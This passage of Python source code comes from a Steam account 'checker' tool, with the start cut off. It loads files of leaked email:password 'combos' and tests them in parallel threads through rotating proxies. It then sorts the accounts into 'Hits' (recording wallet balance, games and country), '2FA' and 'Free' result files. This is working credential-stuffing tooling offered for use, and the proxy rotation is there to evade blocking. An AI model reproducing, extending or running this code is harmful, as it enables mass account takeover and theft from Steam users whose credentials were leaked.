        game_list_str = format_game_list(result.get("game_list", []), max_display=None)  
        summary_box([
            ("Status", "✅ HIT"),
            ("Email", email),
            ("Password", password),
            ("SteamID", result.get("steam_id", "N/A")),
            ("Level", result.get("level", "?")),
            ("Games", result.get("games", 0)),
            ("Game List", game_list_str),
            ("Wallet", result.get("balance", "N/A")),
            ("Country", result.get("country", result.get("cc", "?"))),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ])
    elif result.get("status") == "2fa":
        print()
        summary_box([
            ("Status", "🔐 2FA REQUIRED"),
            ("Email", email),
            ("Password", password),
            ("SteamID", result.get("steam_id", "?")),
            ("Types", result.get("types", "?")),
            ("Checked By", AUTHOR_TAG),
        ])
    elif result.get("status") == "free":
        print()
        summary_box([
            ("Status", "🔓 FREE"),
            ("Email", email),
            ("Password", password),
            ("SteamID", result.get("steam_id", "?")),
            ("Checked By", AUTHOR_TAG),
        ])
    else:
        L("❌", "ERROR", "RESULT", f"{result.get('status', 'Unknown')} – {result.get('message', '')}")

    input(f"{_c('93', '[*] Press Enter to continue...')}")

def file_check_mode(proxies):
    global TOTAL_COMBOS, PROXY_POOL, BAD_PROXIES, HITS_FILE, TWOFA_FILE, FREE_FILE
    section("BULK CHECK")
    filepath = input(f"{_c('96', '[*] Enter combo file path: ')}").strip()
    if not filepath or not os.path.isfile(filepath):
        L("❌", "ERROR", "FILE", "File not found")
        return

    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    combos_set = extract_combos_from_text(content)
    if not combos_set:
        L("❌", "ERROR", "EXTRACT", "No valid combos found in the file.")
        return

    combos = sorted(combos_set)
    L("✅", "INFO", "EXTRACT", f"Extracted {len(combos)} unique combos.")

    if not combos:
        L("❌", "ERROR", "FILE", "No valid combos found")
        return

    try:
        disp_input = input(f"{_c('96', 'How many games to display per hit? (default 10, max 100): ')}").strip()
        if disp_input == "":
            max_games_display = 10
        else:
            max_games_display = int(disp_input)
            if max_games_display < 1:
                max_games_display = 10
            elif max_games_display > 100:
                max_games_display = 100
    except:
        max_games_display = 10

    TOTAL_COMBOS = len(combos)
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    hits_filename = os.path.join(RESULTS_FOLDER, f"Steam_Hits_{timestamp}.txt")
    twofa_filename = os.path.join(RESULTS_FOLDER, f"Steam_2FA_{timestamp}.txt")
    free_filename = os.path.join(RESULTS_FOLDER, f"Steam_Free_{timestamp}.txt")

    HITS_FILE = open(hits_filename, "w", encoding="utf-8")
    TWOFA_FILE = open(twofa_filename, "w", encoding="utf-8")
    FREE_FILE = open(free_filename, "w", encoding="utf-8")
    HITS_FILE.write(f"# Steam Hits - {datetime.now().isoformat()}\n# Checked by {AUTHOR_TAG}\n\n")
    TWOFA_FILE.write(f"# Steam 2FA - {datetime.now().isoformat()}\n# Checked by {AUTHOR_TAG}\n\n")
    FREE_FILE.write(f"# Steam Free - {datetime.now().isoformat()}\n# Checked by {AUTHOR_TAG}\n\n")

    L("📊", "INFO", "FILE", f"Loaded {TOTAL_COMBOS} combos")
    L("⚙️", "INFO", "CONFIG", f"Threads: {CONFIG['threads']} | Timeout: {CONFIG['timeout']}s | Retries: {CONFIG['retries']} | Retry Delay: {CONFIG['retry_delay']}s | Combo Delay: {CONFIG['combo_delay']}s | Debug: {CONFIG['debug']}")

    working_proxies = get_working_proxies(proxies) if proxies else []
    PROXY_POOL = working_proxies
    BAD_PROXIES.clear()

    max_threads = CONFIG["threads"]
    sem = threading.BoundedSemaphore(max_threads)

    def worker(combo):
        if stop_event.is_set():
            return
        try:
            sem.acquire()
            proxy = random.choice(PROXY_POOL) if PROXY_POOL else None
            process_combo(combo, proxy, max_games_display)
        finally:
            sem.release()

    threads = []
    for combo in combos:
        if stop_event.is_set():
            break
        t = threading.Thread(target=worker, args=(combo,))
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(0.01)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        stop_event.set()
        L("🛑", "WARN", "STOP", "Stopping... waiting for threads to finish")
        for t in threads:
            t.join(timeout=2)

    if HITS_FILE:
        HITS_FILE.close()
    if TWOFA_FILE:
        TWOFA_FILE.close()
    if FREE_FILE:
        FREE_FILE.close()

    L("💾", "INFO", "SAVE", f"Results saved to {RESULTS_FOLDER}/")

    divider()
    elapsed = time.time() - START_TIME
    summary_box([
        ("Total", TOTAL_COMBOS),
        ("Hits", stats["hits"]),
        ("2FA", stats["twofa"]),
        ("Free", stats["free"]),
        ("Bad", stats["bad"]),
        ("Banned", stats["ban"]),
        ("Errors", stats["errors"]),
        ("Time", f"{elapsed:.1f}s"),
        ("Results", RESULTS_FOLDER),
    ])

    input(f"{_c('93', '[*] Press Enter to continue...')}")

def main():
    banner(TOOL_NAME, "Steam Account Validator")
    proxies = load_proxies()

    while True:
        _v("m")
        section("MAIN MENU")
        if proxies:
            L("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            L("⚠️", "WARN", "PROXY", "No proxies - direct connection")

        print(_c("96", "[1] Single check"))
        print(_c("96", "[2] Bulk check from file"))
        print(_c("96", "[3] Settings"))
        print(_c("96", "[4] Exit"))

        choice = input(f"{_c('93', '[*] Select: ')}").strip()

        if choice == "1":
            single_check_mode(proxies)
        elif choice == "2":
            stop_event.clear()
            file_check_mode(proxies)
        elif choice == "3":
            settings_menu()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            L("❌", "ERROR", "INPUT", "Invalid choice")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)